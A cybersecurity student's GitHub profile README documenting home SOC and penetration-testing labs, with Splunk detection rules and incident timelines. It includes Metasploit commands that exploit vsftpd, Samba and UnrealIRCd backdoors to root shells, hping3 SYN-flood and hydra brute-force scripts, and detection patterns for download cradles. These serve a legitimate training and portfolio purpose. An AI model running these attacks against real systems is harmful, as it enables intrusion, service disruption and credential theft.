
Readme · MD
Copy

<div align="center">

```
╔══════════════════════════════════════════════════════════════╗
║   ████████╗ █████╗ ██████╗  █████╗ ███╗   ██╗               ║
║      ██╔══╝██╔══██╗██╔══██╗██╔══██╗████╗  ██║               ║
║      ██║   ███████║██████╔╝███████║██╔██╗ ██║               ║
║      ██║   ██╔══██║██╔═══╝ ██╔══██║██║╚██╗██║               ║
║      ██║   ██║  ██║██║     ██║  ██║██║ ╚████║               ║
║      ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝   S A T Y A  ║
╚══════════════════════════════════════════════════════════════╝
```

### `> SOC Analyst · Threat Hunter · VAPT Practitioner`

[![LinkedIn](https://img.shields.io/badge/LinkedIn-tapansb1-0A66C2?style=flat-square&logo=linkedin)](https://www.linkedin.com/in/tapansb1/)
[![Email](https://img.shields.io/badge/Email-tapansatyabhogadi%40gmail.com-EA4335?style=flat-square&logo=gmail)](mailto:tapansatyabhogadi@gmail.com)
[![VAPT Lab](https://img.shields.io/badge/VAPT_Lab-GitHub-181717?style=flat-square&logo=github)](https://github.com/tapansatya/penetration-testing-lab)
![Graduating](https://img.shields.io/badge/Graduating-June_2026-f59e0b?style=flat-square)
![Status](https://img.shields.io/badge/Status-Seeking_Tier--1_SOC_Role-22c55e?style=flat-square)
![Views](https://komarev.com/ghpvc/?username=tapansatya&style=flat-square&color=6366f1&label=profile+views)

</div>

---

## 🧭 Quick Navigation

| Section | Jump To |
|---|---|
| 👤 About Me | [$ whoami](#-whoami) |
| 🔷 SOC Lab | [SOC Lab Project](#-soc-lab--cfss-india-internship) |
| 🔷 VAPT Lab | [Pentest Project](#-penetration-testing-lab--metasploitable-2) |
| 📂 Artifact Index | [All Artifacts Mapped](#-artifact-index) |
| 📖 Case Studies | [IR Case Studies](#-case-studies) |
| ⚙️ Scripts | [Automation Scripts](#-automation-scripts) |
| 🛠️ Skills & Tools | [Skills](#-skills) · [Tools](#-tools) |
| 📜 Certifications | [Certs](#-certifications) |
| 📡 Contact | [Ping Me](#-ping-tapan) |

---

## `$ whoami`

Final-year B.Tech IT student graduating **June 2026**, with hands-on SOC and VAPT experience built entirely from scratch in isolated home labs.

```yaml
internship:            CFSS India SOC Lab  (~160 supervised lab hours, Jan–Feb 2026)
certifications:        5 earned  |  1 in progress (CEH)
lab_environment:       VirtualBox · Splunk SIEM · Windows 10 · Kali Linux · Ubuntu
spl_rules_written:     4  →  7 MITRE ATT&CK techniques mapped
attack_scenarios:      4 executed (SYN flood, port scan, brute-force, malware EID 4688)
cves_exploited:        3 critical  (vsftpd · Samba · UnrealIRCd)  →  root shells
ir_framework:          NIST SP 800-61r2  (full lifecycle, 8-min isolation achieved)
currently_building:    CEH prep + expanding HTB Pro Labs coverage
```

> I don't just study cybersecurity — I build labs, simulate attacks, document findings, and map offence to defence.

---

## `$ ls ./projects`

### 🔷 SOC Lab — CFSS India Internship
`Jan–Feb 2026  ·  ~160 hrs  ·  VirtualBox · Splunk 9.x · Windows 10 · Kali Linux`

> Structured 4-task internship replicating enterprise SOC operations in an isolated lab. All artefacts — SPL rules, IR playbook, MITRE mapping, dashboard JSON — documented and version-controlled.

#### 🖼️ Lab Architecture

```
┌──────────────────────────────────────────────────────────┐
│                    VirtualBox Host                        │
│                                                          │
│  ┌─────────────────┐        ┌───────────────────────┐   │
│  │  Windows 10 VM  │◄──────►│   Kali Linux VM       │   │
│  │  ─────────────  │        │   ─────────────────   │   │
│  │  Splunk 9.x     │        │   Nmap / hping3       │   │
│  │  Universal Fwd  │        │   Metasploit 6.x      │   │
│  │  Sysmon         │        │   Wireshark 4.x       │   │
│  │  Event Logs     │        │   CyberChef           │   │
│  └────────┬────────┘        └───────────────────────┘   │
│           │ Log forwarding (inputs.conf)                  │
│           ▼                                              │
│  ┌─────────────────┐                                     │
│  │  Splunk SIEM    │  ← SPL rules · Dashboards · Alerts │
│  └─────────────────┘                                     │
└──────────────────────────────────────────────────────────┘
```

---

<details>
<summary><b>⚙️ Task 1 — SIEM Setup & Log Ingestion</b> &nbsp;|&nbsp; <i>Click to expand</i></summary>

#### What I Built
Deployed a fully functional Splunk SIEM pipeline from scratch — forwarder config, index validation, and event parsing.

#### Reproducible Setup Commands
```bash
# 1. Install Splunk Universal Forwarder on Windows 10 VM
#    Download: https://www.splunk.com/en_us/download/universal-forwarder.html

# 2. Configure inputs.conf
# File: C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf

[WinEventLog://Security]
disabled = 0
index = wineventlog

[WinEventLog://System]
disabled = 0
index = wineventlog

[WinEventLog://Application]
disabled = 0
index = wineventlog

[monitor://C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx]
disabled = 0
sourcetype = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
index = sysmon
```

#### Validation SPL Queries
```spl
-- Confirm login events are flowing
index=wineventlog EventCode=4624 | stats count by host

-- Confirm failed logins
index=wineventlog EventCode=4625 | stats count by Account_Name

-- Confirm process creation events
index=wineventlog EventCode=4688 | table _time, Account_Name, New_Process_Name

-- Confirm Sysmon process creation (EID 1)
index=sysmon EventCode=1 | table _time, Image, CommandLine, User | head 20
```

#### Key Event IDs Validated
| EID | Source | Meaning |
|---|---|---|
| 4624 | Security | Successful logon |
| 4625 | Security | Failed logon |
| 4688 | Security | Process creation |
| 1 | Sysmon | Process create (with hash + cmdline) |

> 📸 _Add screenshot: `screenshots/task1-splunk-ingestion.png` — Splunk search results showing all 4 log sources flowing_

</details>

---

<details>
<summary><b>🌐 Task 2 — Network Attack Detection</b> &nbsp;|&nbsp; <i>Click to expand</i></summary>

#### What I Detected
Simulated two distinct attack patterns — stealthy port scan and volumetric SYN flood — then distinguished them using Wireshark filters.

#### Reproducible Attack Commands
```bash
# --- SYN Port Scan (Nmap) ---
nmap -sS -p 1-1024 192.168.56.101

# --- SYN Flood (hping3) on port 445 ---
hping3 -S --flood -V -p 445 192.168.56.101
```

#### Wireshark Analysis Filters
```
# Isolate SYN flood on port 445
tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 445

# Isolate Nmap SYN scan (sequential ports)
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Statistics → I/O Graph → observe ~700 pkt/sec spike during flood
```

#### Flood vs. Scan Differentiation
| Indicator | SYN Scan (Nmap) | SYN Flood (hping3) |
|---|---|---|
| Packet rate | ~10–50/sec | ~700/sec |
| Destination ports | Sequential / varied | Single target (445) |
| Response pattern | RST/ACK mix | Overwhelmed — minimal RST |
| Intent | Reconnaissance | Denial of Service |

> 📸 _Add screenshot: `screenshots/task2-wireshark-flood.png` — I/O graph showing 700 pkt/sec spike_
> 📁 _Add PCAP: `pcaps/syn-flood-annotated.pcapng` · `pcaps/syn-scan-annotated.pcapng`_

</details>

---

<details>
<summary><b>🎯 Task 3 — Threat Hunting & SPL Detection Rules</b> &nbsp;|&nbsp; <i>Click to expand</i></summary>

#### SPL Rules — Copy-Paste Ready

**Rule 1 — Brute-Force Login Detection** `T1110.001 · T1110.003`
```spl
index=wineventlog EventCode=4625
| bucket _time span=5m
| stats count as failed_logins by _time, Account_Name, src_ip
| where failed_logins > 5
| eval severity=if(failed_logins > 20, "HIGH", "MEDIUM")
| table _time, Account_Name, src_ip, failed_logins, severity
```
> Tuning: Threshold tested at 3, 5, 10 — settled on **5 failures/5 min** to balance sensitivity vs. false positives.

**Rule 2 — New Service Created** `T1543.003`
```spl
index=wineventlog EventCode=7045
| table _time, ServiceName, ServiceFileName, ServiceType, AccountName
| eval alert="New Service Installed — Review Required"
```

**Rule 3 — Scheduled Task Abuse** `T1053.005`
```spl
index=wineventlog EventCode=4698
| table _time, TaskName, TaskContent, SubjectUserName
| eval suspicious=if(like(TaskContent, "%powershell%") OR like(TaskContent, "%cmd%"), "YES", "NO")
| where suspicious="YES"
```

**Rule 4 — Suspicious PowerShell** `T1059.001 · T1027 · T1105`
```spl
index=sysmon EventCode=1
  (CommandLine="*-EncodedCommand*"
   OR CommandLine="*-enc *"
   OR CommandLine="*IEX*"
   OR CommandLine="*Invoke-Expression*"
   OR CommandLine="*DownloadString*"
   OR CommandLine="*bypass*")
| table _time, User, CommandLine, ParentImage, MD5
| eval risk="HIGH — Investigate Immediately"
```

#### MITRE ATT&CK Coverage
| Technique ID | Name | Rule |
|---|---|---|
| T1110.001 | Brute Force: Password Guessing | Rule 1 |
| T1110.003 | Brute Force: Password Spraying | Rule 1 |
| T1543.003 | Create or Modify: Windows Service | Rule 2 |
| T1053.005 | Scheduled Task/Job | Rule 3 |
| T1059.001 | Command: PowerShell | Rule 4 |
| T1027 | Obfuscated Files (Base64) | Rule 4 |
| T1105 | Ingress Tool Transfer | Rule 4 |

#### Base64 Payload Decode Workflow
```bash
# 1. Copy encoded string from Splunk CommandLine field
# 2. CyberChef recipe: From Base64 → Decode Text (UTF-16LE)
# 3. Submit decoded hash to VirusTotal
#    Lab result: 0/70 — confirmed clean test payload
```

> 📸 _Add screenshot: `screenshots/task3-brute-force-alert.png` — alert firing on threshold_
> 📸 _Add screenshot: `screenshots/task3-mitre-navigator.png` — ATT&CK Navigator layer_
> 📁 _Add file: `mitre/attack-navigator-layer.json`_

</details>

---

<details>
<summary><b>🚨 Task 4 — Incident Response (NIST SP 800-61r2)</b> &nbsp;|&nbsp; <i>Click to expand</i></summary>

#### IR Timeline — Malware Execution Scenario
```
INCIDENT: Encoded PowerShell via EID 4688 (cmd.exe → powershell.exe -EncodedCommand)
SEVERITY: P2 — High
HOST: WIN10-LAB-01

T+00:00  DETECTION     Splunk Rule 4 fires on -EncodedCommand flag
T+00:02  TRIAGE        EID 4688 + Sysmon EID 1 reviewed — parent-child chain confirmed
T+00:05  ESCALATION    P2 confirmed — IR lifecycle initiated
T+08:00  ISOLATION     Host network-isolated via firewall (8 min from detection)
T+12:00  CONTAINMENT   Account disabled · IOCs extracted (hash, cmdline, src_ip)
T+20:00  ERADICATION   Malicious scheduled task removed (EID 4699 confirmed)
T+35:00  RECOVERY      Snapshot restored · Forwarder re-validated
T+35:00  MONITORING    60-min post-recovery window started
T+95:00  CLOSURE       0 re-infection indicators · Incident closed
```

#### Splunk Dashboard Panels (3-Panel, 30-day window)
```spl
-- Panel 1: Login Activity Heatmap
index=wineventlog (EventCode=4624 OR EventCode=4625)
| timechart span=1h count by EventCode

-- Panel 2: Process Creation Timeline
index=sysmon EventCode=1
| timechart span=1h count

-- Panel 3: High-Priority Alerts Feed
index=wineventlog (EventCode=4698 OR EventCode=7045)
  OR (index=sysmon EventCode=1 CommandLine="*-EncodedCommand*")
| table _time, EventCode, Account_Name, CommandLine
| sort -_time
```

> 📸 _Add screenshot: `screenshots/task4-ir-dashboard.png` — 3-panel Splunk dashboard_
> 📸 _Add screenshot: `screenshots/task4-isolation-timeline.png` — event timeline during incident_
> 📁 _Add file: `dashboards/soc-overview.json` · `ir-playbook/phishing-playbook-v1.pdf`_

</details>

---

### 🔷 Penetration Testing Lab — Metasploitable 2
`2025–2026  ·  VirtualBox · Metasploit 6.x · Kali Linux · Nessus`

> Isolated ethical hacking lab — 9 services enumerated, 3 critical CVEs exploited to root, 6 findings documented with CVSS scores, remediation, and Splunk detection mappings.

📁 **[→ Full Vulnerability Report & Lab Artifacts](https://github.com/tapansatya/penetration-testing-lab)**

<details>
<summary><b>🔍 Reconnaissance</b> &nbsp;|&nbsp; <i>Click to expand</i></summary>

#### Reproducible Nmap Commands
```bash
# Quick top-100 first pass
nmap -sS --top-ports 100 192.168.56.102

# Full port + service version scan
nmap -sS -sV -sC -O -p- --open -T4 192.168.56.102 -oN recon/nmap-full.txt

# Vulnerability scripts
nmap --script vuln 192.168.56.102 -oN recon/vuln-scan.txt
```

#### 9 Services Discovered
| Port | Service | Version | Risk |
|---|---|---|---|
| 21 | FTP | vsftpd 2.3.4 | 🔴 Critical |
| 22 | SSH | OpenSSH 4.7p1 | 🟡 Medium |
| 139/445 | SMB | Samba 3.x | 🔴 Critical |
| 6667 | IRC | UnrealIRCd 3.2.8.1 | 🔴 Critical |
| 80 | HTTP | Apache 2.2.8 | 🟡 Medium |
| 5432 | PostgreSQL | 8.3.0–8.3.7 | 🟠 High |
| 3306 | MySQL | 5.0.51a | 🟠 High |
| 8180 | Tomcat | Apache 5.5 | 🟠 High |
| 5900 | VNC | Protocol 3.3 | 🟠 High |

</details>

<details>
<summary><b>⚔️ Exploitation — 3 Critical CVEs to Root</b> &nbsp;|&nbsp; <i>Click to expand</i></summary>

#### CVE-2011-2523 — vsftpd 2.3.4 Backdoor
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
run
# Result: root shell via backdoor port 6200
```
**CVSS:** 10.0 · **Root Cause:** Backdoor injected via compromised SourceForge repo (2011)
**Remediation:** Upgrade vsftpd to 3.x · Block inbound port 6200 at firewall
**Splunk Detection:**
```spl
index=sysmon EventCode=3 DestinationPort=6200
| eval alert="Possible vsftpd backdoor connection"
```

---

#### CVE-2007-2447 — Samba usermap_script RCE
```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.102
set LHOST 192.168.56.101
run
# Result: root shell via shell metacharacter injection
```
**CVSS:** 10.0 · **Root Cause:** Unfiltered shell metacharacters passed to `/bin/sh`
**Remediation:** Upgrade Samba to 3.0.26a+ · Disable `username map script`
**Splunk Detection:**
```spl
index=sysmon EventCode=1 Image="*smbd*"
  (CommandLine="*;*" OR CommandLine="*`*" OR CommandLine="*|*")
| table _time, User, CommandLine, ParentImage
```

---

#### CVE-2010-2075 — UnrealIRCd 3.2.8.1 Backdoor
```bash
msfconsole -q
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.102
set RPORT 6667
run
# Result: root shell via DEBUG3 backdoor command
```
**CVSS:** 10.0 · **Root Cause:** Backdoor in official download package (supply chain attack)
**Remediation:** Remove UnrealIRCd · Replace with clean verified binary
**Splunk Detection:**
```spl
index=sysmon EventCode=3 DestinationPort=6667
| stats count by SourceIp, DestinationIp
| where count > 10
| eval alert="Repeated IRC connections — potential C2 or backdoor"
```

</details>

<details>
<summary><b>🛡️ Offensive → Defensive Mapping</b> &nbsp;|&nbsp; <i>Click to expand</i></summary>

| CVE | Attack Vector | Sysmon EID | Detection Signal |
|---|---|---|---|
| CVE-2011-2523 | Outbound port 6200 | EID 3 | Unusual outbound connection |
| CVE-2007-2447 | Shell metachar in SMB | EID 1 | smbd spawning /bin/sh |
| CVE-2010-2075 | IRC DEBUG3 backdoor | EID 3 | Repeated port 6667 traffic |
| All 3 | Root shell obtained | EID 1 | Privileged process + unusual Image |

</details>

---

## `$ cat ./case-studies`

### 📖 Case Studies

<details>
<summary><b>Case Study 001 — Brute Force Login Campaign</b></summary>

**Scenario:** Repeated failed logins against WIN10-LAB-01 from Kali VM
**Severity:** P3 · **Detection:** SPL Rule 1 (>5 failures/5 min)

```
T+00:00  Alert fires — 8 failures in 5-min window
T+00:03  Queried: index=wineventlog EventCode=4625 src=192.168.56.103
T+00:05  Confirmed single-source brute-force (not distributed spray)
T+00:08  Source IP blocked at host firewall
T+00:10  Account locked as precaution (EID 4740 confirmed)
T+00:20  No successful login from source — contained
```

**Outcome:** Contained. No authentication success. IOC added to watchlist.
**Lesson:** Threshold 5 works for lab; production may need 10–15 to handle service account retries.

</details>

<details>
<summary><b>Case Study 002 — Malware Execution via Encoded PowerShell</b></summary>

**Scenario:** Encoded PowerShell detected via Sysmon EID 1
**Severity:** P2 · **Detection:** SPL Rule 4 (`-EncodedCommand`)

```
T+00:00  Sysmon EID 1 fires — powershell.exe -EncodedCommand
T+00:02  Parent: cmd.exe — unusual for user session, escalate
T+00:04  Base64 decoded via CyberChef → download cradle identified
T+00:06  Hash on VirusTotal → 0/70 (confirmed test payload)
T+08:00  Host isolated · Account disabled · IOCs extracted
T+20:00  Scheduled task removed (EID 4699 confirmed)
T+35:00  Snapshot restored · Forwarder re-validated
T+95:00  60-min monitoring complete · 0 re-infection · Closed P2
```

**Outcome:** Contained. Persistence removed. Host restored clean.
**Artefacts:** `ir-playbook/phishing-playbook-v1.pdf` · `dashboards/soc-overview.json`

</details>

<details>
<summary><b>Case Study 003 — SYN Flood on Port 445</b></summary>

**Scenario:** hping3 flood simulating DoS against SMB service
**Detection:** Wireshark I/O graph spike + display filter analysis

```
T+00:00  hping3 flood started from Kali (port 445, ~700 pkt/sec)
T+00:05  Wireshark I/O graph spike detected beyond baseline
T+00:07  Filter applied: tcp.flags.syn==1 && tcp.dstport==445
T+00:10  Distinguished from Nmap scan (rate + single-port pattern confirmed)
T+01:00  Flood stopped · baseline restored
```

**Outcome:** Detection workflow validated. Flood vs. scan methodology documented.
**PCAP:** `pcaps/syn-flood-annotated.pcapng`

</details>

---

## `$ cat ./artifact-index`

### 📂 Artifact Index
> Every project file mapped to the skill it demonstrates and how to reproduce it.

#### SOC Lab (`./soc-lab-cfss/`)

| File | Type | Skill Demonstrated |
|---|---|---|
| `splunk/rules/brute-force-detection.spl` | SPL Query | T1110 detection, threshold tuning |
| `splunk/rules/new-service-alert.spl` | SPL Query | T1543.003 persistence detection |
| `splunk/rules/scheduled-task-abuse.spl` | SPL Query | T1053.005 detection |
| `splunk/rules/suspicious-powershell.spl` | SPL Query | T1059.001 + T1027 obfuscation |
| `splunk/dashboards/soc-overview.json` | Dashboard Export | 3-panel SOC monitoring view |
| `splunk/config/inputs.conf` | Config File | Log ingestion pipeline setup |
| `ir-playbook/phishing-playbook-v1.pdf` | IR Playbook | NIST 8-step IR, P1–P4 severity matrix |
| `mitre/attack-navigator-layer.json` | ATT&CK Layer | 7 techniques mapped + visualised |
| `pcaps/syn-flood-annotated.pcapng` | PCAP | Wireshark flood analysis |
| `pcaps/syn-scan-annotated.pcapng` | PCAP | Wireshark scan analysis |
| `screenshots/` | Images | Dashboard, alert, and capture evidence |
| `case-studies/CS-001-brute-force.md` | Case Study | IR timeline + outcome |
| `case-studies/CS-002-powershell-malware.md` | Case Study | IR timeline + outcome |
| `case-studies/CS-003-syn-flood.md` | Case Study | Detection workflow |
| `scripts/setup-splunk-forwarder.ps1` | PowerShell | Automated forwarder + inputs.conf deploy |
| `scripts/run-attack-scenarios.sh` | Bash | Kali attack simulation runner |

#### VAPT Lab ([`penetration-testing-lab/`](https://github.com/tapansatya/penetration-testing-lab))

| File | Type | Skill Demonstrated |
|---|---|---|
| `recon/nmap-full.txt` | Nmap Output | Service enumeration, port scanning |
| `reports/vapt-report-metasploitable2.pdf` | Report | 6 findings, CVSS scores, remediation |
| `exploits/cve-2011-2523-vsftpd.md` | Writeup | Exploitation steps + detection rule |
| `exploits/cve-2007-2447-samba.md` | Writeup | Exploitation steps + detection rule |
| `exploits/cve-2010-2075-unrealircd.md` | Writeup | Exploitation steps + detection rule |
| `defensive-mapping/splunk-detection-rules.spl` | SPL Rules | Attacker behaviour → SIEM alert |
| `screenshots/` | Images | Root shells, Metasploit output |
| `scripts/auto-recon.sh` | Bash | Automated Nmap recon pipeline |

---

## `$ ls ./scripts`

### ⚙️ Automation Scripts

<details>
<summary><b>setup-splunk-forwarder.ps1</b> — Automated Splunk forwarder deployment</summary>

```powershell
# Run as Administrator on Windows 10 VM
$splunkHome = "C:\Program Files\SplunkUniversalForwarder"
$inputsConf = "$splunkHome\etc\system\local\inputs.conf"

$config = @"
[WinEventLog://Security]
disabled = 0
index = wineventlog

[WinEventLog://System]
disabled = 0
index = wineventlog

[WinEventLog://Application]
disabled = 0
index = wineventlog

[monitor://C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx]
disabled = 0
sourcetype = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
index = sysmon
"@

Set-Content -Path $inputsConf -Value $config
Restart-Service -Name "SplunkForwarder"
Write-Host "[+] Splunk Universal Forwarder configured and restarted."
```

</details>

<details>
<summary><b>run-attack-scenarios.sh</b> — Kali attack simulation runner</summary>

```bash
#!/bin/bash
TARGET="192.168.56.101"  # Windows 10 VM IP

echo "[1/3] Nmap SYN scan..."
nmap -sS -p 1-1024 $TARGET -oN /tmp/nmap-scan.txt

echo "[2/3] SYN flood on port 445 (10 seconds)..."
timeout 10 hping3 -S --flood -p 445 $TARGET

echo "[3/3] Brute force simulation (hydra SSH, 20 attempts)..."
hydra -l testuser -P /usr/share/wordlists/rockyou.txt $TARGET ssh \
  -t 4 -o /tmp/hydra-output.txt -e nsr -f

echo "[+] Scenarios complete. Check Splunk for alerts."
```

</details>

<details>
<summary><b>auto-recon.sh</b> — VAPT automated reconnaissance pipeline</summary>

```bash
#!/bin/bash
TARGET="192.168.56.102"  # Metasploitable 2 IP
OUT="./recon"
mkdir -p $OUT

echo "[1/4] Quick top-1000 scan..."
nmap -sS --top-ports 1000 $TARGET -oN $OUT/quick-scan.txt

echo "[2/4] Full port + service version scan..."
nmap -sS -sV -sC -p- -T4 --open $TARGET -oN $OUT/full-scan.txt

echo "[3/4] Vulnerability scripts..."
nmap --script vuln $TARGET -oN $OUT/vuln-scan.txt

echo "[4/4] UDP key ports..."
nmap -sU -p 53,111,161 $TARGET -oN $OUT/udp-scan.txt

echo "[+] Recon complete. Results in $OUT/"
```

</details>

---

## `$ ls ./skills`

### 🛡️ Blue Team

| Skill | Project |
|---|---|
| SIEM Implementation & Log Ingestion | SOC Lab |
| SPL Query Writing & Alert Tuning | SOC Lab |
| Network Attack Detection (Flood, Scan) | SOC Lab |
| Threat Hunting & MITRE ATT&CK Mapping | SOC Lab |
| Incident Response (NIST SP 800-61r2) | SOC Lab |
| Dashboard & Reporting (Splunk) | SOC Lab |

### ⚔️ Red Team

| Skill | Project |
|---|---|
| Penetration Testing & CVE Exploitation | VAPT Lab |
| Vulnerability Assessment (CVSS scoring) | VAPT Lab |
| Remediation Documentation | VAPT Lab |
| Offensive → Defensive Detection Mapping | Both Labs |

---

## `$ ls ./tools`

<div align="center">

**Network & Packet Analysis**

![Wireshark](https://img.shields.io/badge/Wireshark-1679A7?style=flat-square&logo=Wireshark&logoColor=white)
![Nmap](https://img.shields.io/badge/Nmap-214478?style=flat-square)
![hping3](https://img.shields.io/badge/hping3-333333?style=flat-square)

**SIEM & Threat Intelligence**

![Splunk](https://img.shields.io/badge/Splunk-000000?style=flat-square&logo=Splunk&logoColor=white)
![VirusTotal](https://img.shields.io/badge/VirusTotal-3949AB?style=flat-square)
![CyberChef](https://img.shields.io/badge/CyberChef-4CAF50?style=flat-square)

**Endpoint Visibility**

![Sysmon](https://img.shields.io/badge/Sysmon-0078D4?style=flat-square&logo=Windows&logoColor=white)
![Windows Event Logs](https://img.shields.io/badge/Windows_Event_Logs-0078D4?style=flat-square&logo=Microsoft&logoColor=white)

**Offensive Security**

![Metasploit](https://img.shields.io/badge/Metasploit-2596CD?style=flat-square)
![Burp Suite](https://img.shields.io/badge/Burp_Suite-FF6633?style=flat-square&logo=PortSwigger&logoColor=white)
![Nessus](https://img.shields.io/badge/Nessus-00B0D8?style=flat-square)
![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=flat-square&logo=Kali-Linux&logoColor=white)

**Infrastructure**

![VirtualBox](https://img.shields.io/badge/VirtualBox-183A61?style=flat-square&logo=VirtualBox&logoColor=white)
![Ubuntu](https://img.shields.io/badge/Ubuntu-E95420?style=flat-square&logo=Ubuntu&logoColor=white)
![Windows](https://img.shields.io/badge/Windows_10%2F11-0078D4?style=flat-square&logo=Microsoft&logoColor=white)

</div>

---

## `$ cat ./certifications`

| Certification | Issuer | Year |
|---|---|---|
| ✅ Certified SOC Analyst | CFSS India | Feb 2026 |
| ✅ CCNA: Cisco Certified Network Associate | Cisco | 2025 |
| ✅ CNSP: Certified Network Security Practitioner | Security Blue Team | 2025 |
| ✅ Advanced Ethical Hacking | CCST | 2025 |
| ✅ Cyber Security Analyst | HackTheBox Academy | 2025 |
| ✅ Virtual Cyber Security | Forage | 2023 |
| 🔄 CEH: Certified Ethical Hacker | EC-Council | In Progress |

---

<div align="center">

## `$ ping tapan`

```
PING tapan — awaiting response...

  📧  tapansatyabhogadi@gmail.com
  🔗  linkedin.com/in/tapansb1/
  💻  github.com/tapansatya

[Reply accepted · Average response time: < 24 hrs]
```

![GitHub Stats](https://github-readme-stats.vercel.app/api?username=tapansatya&show_icons=true&theme=dark&hide_border=true&bg_color=0d1117&title_color=22c55e&icon_color=22c55e)

---

<sub>Built with curiosity · Secured by practice · Documented for impact</sub>

</div>
